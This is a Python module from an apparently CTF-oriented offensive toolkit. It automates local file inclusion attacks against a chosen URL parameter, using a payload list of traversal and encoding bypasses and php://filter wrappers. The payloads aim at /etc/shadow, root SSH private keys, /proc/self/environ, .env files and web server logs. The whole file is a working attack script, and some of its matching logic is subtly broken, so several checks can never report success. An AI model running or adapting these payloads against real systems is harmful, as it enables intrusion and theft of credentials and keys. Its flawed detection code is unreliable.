
import re
import requests
import urllib3
from core.target import get_current_url
urllib3.disable_warnings()
PROVIDES=[];REQUIRES=[]
G='\033[92m';C='\033[96m';B='\033[94m';Y='\033[93m';R='\033[91m';W='\033[0m'
CHECKS = [

    # =========================================================
    # BASIC LFI
    # =========================================================

    ("Basic LFI", "/etc/passwd", "root:"),
    ("Traversal x4", "../../../../etc/passwd", "root:"),
    ("Traversal x6", "../../../../../../etc/passwd", "root:"),
    ("Traversal x10", "../../../../../../../../../../etc/passwd", "root:"),
    ("Absolute", "/etc/passwd", "root:"),

    # =========================================================
    # RECURSIVE BYPASSES
    # =========================================================

    ("Recursive //", "....//....//....//....//etc/passwd", "root:"),
    ("Recursive /./", "..././..././..././etc/passwd", "root:"),
    ("Recursive \\", "....\\\\....\\\\....\\\\etc/passwd", "root:"),
    ("Many Slashes", "....////....////....////etc/passwd", "root:"),

    # =========================================================
    # URL ENCODED
    # =========================================================

    ("Encoded", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "root:"),
    ("Double Encoded", "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd", "root:"),

    # =========================================================
    # APPROVED PATH BYPASSES
    # =========================================================

    ("languages/", "./languages/../../../../etc/passwd", "root:"),
    ("templates/", "./templates/../../../../etc/passwd", "root:"),
    ("includes/", "./includes/../../../../etc/passwd", "root:"),
    ("lang_", "/../../../etc/passwd", "root:"),

    # =========================================================
    # LINUX FILES
    # =========================================================

    ("passwd", "/etc/passwd", "root:"),
    ("shadow", "/etc/shadow", "root:"),
    ("hosts", "/etc/hosts", "localhost"),
    ("hostname", "/etc/hostname", ""),
    ("issue", "/etc/issue", ""),
    ("os-release", "/etc/os-release", "PRETTY_NAME"),
    ("bash_history", "/root/.bash_history", ""),
    ("profile", "/root/.profile", ""),
    ("authorized_keys", "/root/.ssh/authorized_keys", "ssh-"),
    ("id_rsa", "/root/.ssh/id_rsa", "PRIVATE KEY"),

    # =========================================================
    # PROC
    # =========================================================

    ("proc environ", "/proc/self/environ", "PATH="),
    ("proc fd0", "/proc/self/fd/0", ""),
    ("proc fd1", "/proc/self/fd/1", ""),
    ("proc fd2", "/proc/self/fd/2", ""),
    ("proc mounts", "/proc/mounts", "/"),
    ("proc version", "/proc/version", "Linux"),

    # =========================================================
    # PHP FILTERS
    # =========================================================

    ("PHP Filter index",
     "php://filter/read=convert.base64-encode/resource=index", None),

    ("PHP Filter config",
     "php://filter/read=convert.base64-encode/resource=config", None),

    ("PHP Filter db",
     "php://filter/read=convert.base64-encode/resource=db", None),

    # =========================================================
    # LOGS
    # =========================================================

    ("Apache access", "/var/log/apache2/access.log", "HTTP/"),
    ("Apache error", "/var/log/apache2/error.log", "PHP"),
    ("Nginx access", "/var/log/nginx/access.log", "HTTP/"),
    ("Nginx error", "/var/log/nginx/error.log", "error"),

    # =========================================================
    # PHP SESSIONS
    # =========================================================

    ("PHP Sessions", "/var/lib/php/sessions/", "sess_"),

    # =========================================================
    # WINDOWS
    # =========================================================

    ("Windows win.ini", "../../../../Windows/win.ini", "[fonts]"),
    ("Windows boot.ini", "../../../../boot.ini", "[boot loader]"),
    ("Windows hosts",
     "../../../../Windows/System32/drivers/etc/hosts",
     "localhost"),

    # =========================================================
    # COMMON WEB FILES
    # =========================================================

    ("index.php", "../../../../var/www/html/index.php", "<?php"),
    ("config.php", "../../../../var/www/html/config.php", "<?php"),
    (".env", "../../../../var/www/html/.env", "APP_"),
]
def req(url,p,v):
    try:
        return requests.get(url,params={p:v},timeout=8,verify=False).text
    except: return ""
def phpfilter(t): return bool(re.findall(r"[A-Za-z0-9+/=]{200,}",t))
def run(data,cred,args):
    base=get_current_url(data)
    if not base:
        print(f"\\n{R}[!] No target selected.{W}\\n");return
    url=input(f"{Y}Base URL [{base}]> {W}").strip() or base
    param=input(f"{Y}LFI Parameter [language]> {W}").strip() or "language"
    print(f"\\n{G}[+] Running automatic LFI checks...{W}\\n")
    findings=[]
    for n,p,needle in CHECKS:
        print(f"{C}[*]{W} {n}")
        print(f"    {url}?{param}={p}")
        body=req(url,param,p)
        ok=phpfilter(body) if n=="PHP Filter" else (needle.lower() in body.lower() if needle else False)
        if ok:
            findings.append(n);print(f"    {G}[+] Possible success{W}\\n")
        else:
            print(f"    {R}[-] No match{W}\\n")
    print(f"{B}=============================={W}")
    print(f"{G}Summary{W}")
    print(f"{B}=============================={W}")
    if not findings:
        print(f"{R}No successful checks.{W}");return
    [print(f"{G}[+] {x}{W}") for x in findings]
    if "PHP Filter" in findings: print(f"\\n{C}Recommended:{W} ctf lfi.source")
    if any(x in findings for x in ("Apache","Nginx","proc")): print(f"{C}Recommended:{W} ctf lfi.log")
    if any(x in findings for x in ("Basic LFI","Traversal")): print(f"{C}Recommended:{W} ctf lfi.rce")

